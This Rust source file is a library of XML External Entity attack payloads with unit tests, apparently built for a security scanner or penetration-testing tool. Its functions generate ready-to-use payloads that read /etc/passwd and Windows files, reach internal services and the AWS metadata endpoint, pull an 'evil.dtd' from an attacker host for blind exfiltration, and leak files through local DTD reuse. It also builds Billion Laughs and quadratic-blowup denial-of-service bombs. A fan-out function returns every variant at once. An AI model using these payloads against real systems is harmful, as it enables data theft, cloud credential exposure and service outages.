//! XML External Entity (XXE) attack payload library.
//!
//! XXE is the class of attacks where the XML parser resolves
//! `<!ENTITY xxe SYSTEM "...">` declarations. The "system" reference
//! can be a local file (file://), a URL (http://), an LDAP/DICT
//! query, or even an FTP fetch. Any XML-consuming parser without
//! external-entity resolution disabled is at risk.
//!
//! Modern parsers default to "external entities disabled" but
//! legacy code paths (older Java, .NET pre-4.5.2 with default
//! XmlDocument, libxml2 < 2.9.0, old Spring SAML libs) still
//! resolve.
//!
//! Coverage:
//!
//! - **Classic file read**: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
//! - **Windows file read**: `file:///c:/windows/win.ini`.
//! - **HTTP SSRF**: `<!ENTITY xxe SYSTEM "http://attacker/x">`.
//! - **Internal SSRF**: `http://127.0.0.1:8080/admin`.
//! - **AWS IMDS**: `http://169.254.169.254/latest/meta-data/`.
//! - **DTD-via-URL blind XXE**: defines the entity in a remote DTD,
//!   then references it. Works when the parser fetches but doesn't
//!   echo back.
//! - **Parameter-entity (`%`) XXE**: blind XXE via param entities
//!   in the DTD subset.
//! - **Billion Laughs / XML bomb**: nested entity expansion DoS.
//! - **Quadratic blowup**: long entity value referenced many times.
//! - **SVG XXE**: SVG files are XML; if the consumer renders SVG
//!   with an entity-resolving parser, XXE fires.
//! - **DOCX / XLSX XXE**: Office Open XML files are ZIPs of XML.
//! - **SOAP XXE**: SOAP envelope contains the entity declaration.
//! - **JSON-as-XML**: server parses JSON through an XML parser.
//! - **Local DTD reuse trick** (Phithon's local-dtd technique).

/// Classic file-read XXE.
#[must_use]
pub fn xxe_file_read(file_path: &str) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n\
         <!DOCTYPE root [<!ENTITY xxe SYSTEM \"file://{file_path}\">]>\n\
         <root>&xxe;</root>"
    )
}

/// Windows file-read variant (different path syntax).
#[must_use]
pub fn xxe_windows_file(path: &str) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n\
         <!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///{path}\">]>\n\
         <root>&xxe;</root>"
    )
}

/// HTTP SSRF XXE.
#[must_use]
pub fn xxe_http_ssrf(attacker_url: &str) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n\
         <!DOCTYPE root [<!ENTITY xxe SYSTEM \"{attacker_url}\">]>\n\
         <root>&xxe;</root>"
    )
}

/// AWS IMDS-targeted XXE.
#[must_use]
pub fn xxe_aws_imds() -> String {
    xxe_http_ssrf("http://169.254.169.254/latest/meta-data/")
}

/// Internal-service SSRF XXE.
#[must_use]
pub fn xxe_internal_ssrf(host: &str, port: u16, path: &str) -> String {
    xxe_http_ssrf(&format!("http://{host}:{port}{path}"))
}

/// Parameter-entity blind XXE — defines `%xxe` in a parameter
/// entity, then references it. Some parsers resolve param entities
/// even when general-entity resolution is disabled.
#[must_use]
pub fn xxe_parameter_entity(attacker_url: &str) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n\
         <!DOCTYPE root [\n\
         <!ENTITY % xxe SYSTEM \"{attacker_url}\">\n\
         %xxe;\n\
         ]>\n\
         <root></root>"
    )
}

/// DTD-via-URL blind XXE — fetches a remote DTD that itself
/// contains the data-exfiltration entity. The two-step prevents
/// the local parser from needing inline `&xxe;` reference.
#[must_use]
pub fn xxe_remote_dtd(attacker_dtd_url: &str) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n\
         <!DOCTYPE root SYSTEM \"{attacker_dtd_url}\">\n\
         <root></root>"
    )
}

/// Billion Laughs XML bomb — recursive entity expansion. 10 levels
/// of 10 references each = 10^10 chars when expanded.
#[must_use]
pub fn billion_laughs() -> &'static str {
    "<?xml version=\"1.0\"?>\n\
     <!DOCTYPE lolz [\n\
     <!ENTITY lol \"lol\">\n\
     <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n\
     <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n\
     <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n\
     <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n\
     <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n\
     <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n\
     <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n\
     <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n\
     ]>\n\
     <lolz>&lol9;</lolz>"
}

/// Quadratic blowup — one long entity referenced many times. Less
/// dramatic than Billion Laughs but defeats some "max nested
/// expansion depth" guards that don't cap total expanded size.
#[must_use]
pub fn quadratic_blowup(times: usize) -> String {
    let big = "A".repeat(10_000);
    let refs = "&a;".repeat(times);
    format!(
        "<?xml version=\"1.0\"?>\n\
         <!DOCTYPE root [<!ENTITY a \"{big}\">]>\n\
         <root>{refs}</root>"
    )
}

/// SVG-wrapped XXE — image consumers (avatar uploads, chart
/// renderers) that pass SVG through an XML parser are vulnerable.
#[must_use]
pub fn svg_xxe(attacker_url: &str) -> String {
    format!(
        "<?xml version=\"1.0\" standalone=\"no\"?>\n\
         <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\" [\n\
         <!ENTITY xxe SYSTEM \"{attacker_url}\">\n\
         ]>\n\
         <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">\n\
         <text x=\"0\" y=\"50\">&xxe;</text>\n\
         </svg>"
    )
}

/// SOAP envelope XXE — wrap the entity declaration in a SOAP
/// envelope so the consumer's SOAP parser resolves it.
#[must_use]
pub fn soap_xxe(file_path: &str) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n\
         <!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM \"file://{file_path}\">]>\n\
         <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\
         <soap:Body><x>&xxe;</x></soap:Body>\n\
         </soap:Envelope>"
    )
}

/// JSON-as-XML XXE — when the server's JSON parser falls back to
/// XML parsing for `Content-Type: text/xml` despite the body
/// looking like JSON. Some Spring stacks have this gadget.
#[must_use]
pub fn json_as_xml_xxe() -> &'static str {
    "<?xml version=\"1.0\"?>\n\
     <!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n\
     <r>&xxe;</r>"
}

/// Phithon's local-DTD reuse trick — when the parser blocks
/// network fetches but a local DTD (`/usr/share/yelp/dtd/docbookx.dtd`,
/// `C:\Windows\System32\schemas\TrustedTime\trustedtime.xsd`)
/// exists on the target, the attacker re-uses its parameter
/// entities to leak data.
#[must_use]
pub fn local_dtd_reuse(local_dtd_path: &str, file_to_read: &str) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n\
         <!DOCTYPE root [\n\
         <!ENTITY % local_dtd SYSTEM \"file://{local_dtd_path}\">\n\
         <!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM \"file://{file_to_read}\">\n\
         <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\n\
         &#x25;eval;\n\
         &#x25;error;\n\
         '>\n\
         %local_dtd;\n\
         ]>\n\
         <root></root>"
    )
}

/// One-shot fan-out: every XXE shape for one (attacker_url,
/// file_path) pair.
#[must_use]
pub fn all_xxe_attacks(attacker_url: &str, file_path: &str) -> Vec<(&'static str, String)> {
    vec![
        ("file-read", xxe_file_read(file_path)),
        ("windows-file", xxe_windows_file("c:/windows/win.ini")),
        ("http-ssrf", xxe_http_ssrf(attacker_url)),
        ("aws-imds", xxe_aws_imds()),
        ("internal-ssrf-admin", xxe_internal_ssrf("127.0.0.1", 8080, "/admin")),
        ("parameter-entity", xxe_parameter_entity(attacker_url)),
        (
            "remote-dtd",
            xxe_remote_dtd(&format!("{attacker_url}/evil.dtd")),
        ),
        ("billion-laughs", billion_laughs().to_string()),
        ("quadratic-blowup-1000", quadratic_blowup(1000)),
        ("svg-xxe", svg_xxe(attacker_url)),
        ("soap-xxe", soap_xxe(file_path)),
        ("json-as-xml", json_as_xml_xxe().to_string()),
        (
            "local-dtd-reuse",
            local_dtd_reuse("/usr/share/yelp/dtd/docbookx.dtd", file_path),
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xxe_file_read_format() {
        let p = xxe_file_read("/etc/passwd");
        assert!(p.contains("<!ENTITY xxe SYSTEM"));
        assert!(p.contains("file:///etc/passwd"));
        assert!(p.contains("&xxe;"));
    }

    #[test]
    fn xxe_windows_file_format() {
        let p = xxe_windows_file("c:/windows/win.ini");
        assert!(p.contains("file:///c:/windows/win.ini"));
    }

    #[test]
    fn xxe_http_ssrf_format() {
        let p = xxe_http_ssrf("http://attacker/x");
        assert!(p.contains("SYSTEM \"http://attacker/x\""));
    }

    #[test]
    fn xxe_aws_imds_targets_imds_ip() {
        let p = xxe_aws_imds();
        assert!(p.contains("169.254.169.254"));
        assert!(p.contains("/latest/meta-data/"));
    }

    #[test]
    fn xxe_internal_ssrf_includes_port() {
        let p = xxe_internal_ssrf("127.0.0.1", 8080, "/admin");
        assert!(p.contains("http://127.0.0.1:8080/admin"));
    }

    #[test]
    fn xxe_parameter_entity_uses_percent() {
        let p = xxe_parameter_entity("http://a");
        assert!(p.contains("<!ENTITY % xxe"));
        assert!(p.contains("%xxe;"));
    }

    #[test]
    fn xxe_remote_dtd_uses_system_at_doctype() {
        let p = xxe_remote_dtd("http://attacker/evil.dtd");
        assert!(p.contains("<!DOCTYPE root SYSTEM"));
        assert!(p.contains("http://attacker/evil.dtd"));
    }

    #[test]
    fn billion_laughs_has_9_levels() {
        let p = billion_laughs();
        for n in 1..=9 {
            assert!(p.contains(&format!("ENTITY lol{n}")) || p.contains("ENTITY lol "));
        }
    }

    #[test]
    fn quadratic_blowup_has_n_references() {
        let p = quadratic_blowup(50);
        assert_eq!(p.matches("&a;").count(), 50);
    }

    #[test]
    fn quadratic_blowup_long_entity_value() {
        let p = quadratic_blowup(1);
        // 10_000 A's in the entity value.
        assert!(p.matches("AAAA").count() >= 1);
    }

    #[test]
    fn svg_xxe_has_xml_decl_and_doctype() {
        let p = svg_xxe("http://attacker");
        assert!(p.starts_with("<?xml"));
        assert!(p.contains("DOCTYPE svg"));
        assert!(p.contains("xmlns=\"http://www.w3.org/2000/svg\""));
        assert!(p.contains("&xxe;"));
    }

    #[test]
    fn soap_xxe_wraps_in_envelope() {
        let p = soap_xxe("/etc/passwd");
        assert!(p.contains("<soap:Envelope"));
        assert!(p.contains("</soap:Envelope>"));
        assert!(p.contains("<soap:Body>"));
        assert!(p.contains("&xxe;"));
    }

    #[test]
    fn json_as_xml_constant() {
        let p = json_as_xml_xxe();
        assert!(p.contains("<!ENTITY xxe SYSTEM"));
        assert!(p.contains("file:///etc/passwd"));
    }

    #[test]
    fn local_dtd_reuse_includes_two_paths() {
        let p = local_dtd_reuse("/usr/share/yelp/dtd/x.dtd", "/etc/passwd");
        assert!(p.contains("/usr/share/yelp/dtd/x.dtd"));
        assert!(p.contains("/etc/passwd"));
    }

    #[test]
    fn local_dtd_reuse_uses_param_entity_indirection() {
        let p = local_dtd_reuse("a", "b");
        // The trick uses %file; -> %error; chain.
        assert!(p.contains("&#x25;file"));
        assert!(p.contains("&#x25;eval"));
        assert!(p.contains("&#x25;error"));
    }

    #[test]
    fn all_xxe_attacks_minimum_count() {
        let v = all_xxe_attacks("http://a", "/etc/passwd");
        assert!(v.len() >= 11);
    }

    #[test]
    fn all_xxe_attacks_unique_names() {
        let v = all_xxe_attacks("http://a", "/x");
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), v.len());
    }

    #[test]
    fn all_xxe_each_payload_has_xml_decl() {
        let v = all_xxe_attacks("http://a", "/x");
        for (name, payload) in &v {
            // JSON-as-XML is the only one that starts with the xml
            // decl on a const string — all should start with `<?xml`.
            assert!(
                payload.starts_with("<?xml") || payload.contains("<!DOCTYPE"),
                "{name} missing XML decl / DOCTYPE: {payload}"
            );
        }
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_xxe_attacks("http://a", "/x");
        let b = all_xxe_attacks("http://a", "/x");
        assert_eq!(a, b);
    }

    #[test]
    fn adversarial_long_url_no_panic() {
        let big = "x".repeat(10_000);
        let _ = xxe_http_ssrf(&big);
        let _ = svg_xxe(&big);
        let _ = quadratic_blowup(10_000);
    }

    #[test]
    fn handles_unicode_path() {
        let p = xxe_file_read("/ètc/pässwd");
        assert!(p.contains("/ètc/pässwd"));
    }

    #[test]
    fn billion_laughs_self_contained_dtd() {
        let p = billion_laughs();
        // No external SYSTEM reference — purely local entities.
        assert!(!p.contains("SYSTEM"));
    }

    #[test]
    fn xxe_http_ssrf_no_extra_data() {
        let p = xxe_http_ssrf("http://a");
        // The entity reference comes once.
        assert_eq!(p.matches("&xxe;").count(), 1);
    }

    #[test]
    fn quadratic_blowup_zero_refs() {
        let p = quadratic_blowup(0);
        assert!(!p.contains("&a;"));
        assert!(p.contains("ENTITY a"));
    }
}
